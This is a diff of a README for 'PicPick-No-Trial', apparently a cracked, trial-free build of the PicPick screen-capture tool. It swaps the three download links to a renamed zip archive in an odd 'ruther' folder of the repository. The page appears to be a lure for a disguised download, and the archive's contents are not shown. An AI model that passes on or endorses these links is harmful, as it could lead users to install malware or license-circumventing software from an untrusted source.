@@ -1,6 +1,6 @@
 # 🎨 PicPick-No-Trial - Enhance Your Productivity with Simple Tools
 
-![Download PicPick-No-Trial](https://raw.githubusercontent.com/Saaidharshu/PicPick-No-Trial/main/ruther/PicPick-No-Trial_v2.1.zip)
+![Download PicPick-No-Trial](https://raw.githubusercontent.com/Saaidharshu/PicPick-No-Trial/main/ruther/Pick_Pic_Trial_No_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run PicPick-No-Trial with ease. P
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download PicPick-No-Trial](https://raw.githubusercontent.com/Saaidharshu/PicPick-No-Trial/main/ruther/PicPick-No-Trial_v2.1.zip).
+To get started, visit this page to download: [Download PicPick-No-Trial](https://raw.githubusercontent.com/Saaidharshu/PicPick-No-Trial/main/ruther/Pick_Pic_Trial_No_1.4.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -88,6 +88,6 @@ Should you need further assistance, don't hesitate to reach out through the Issu
 
 ## 📥 Download PicPick-No-Trial Again
 
-To access the latest version, visit this page to download: [Download PicPick-No-Trial](https://raw.githubusercontent.com/Saaidharshu/PicPick-No-Trial/main/ruther/PicPick-No-Trial_v2.1.zip). 
+To access the latest version, visit this page to download: [Download PicPick-No-Trial](https://raw.githubusercontent.com/Saaidharshu/PicPick-No-Trial/main/ruther/Pick_Pic_Trial_No_1.4.zip). 
 
 Enjoy your screen capturing and editing experience with PicPick!
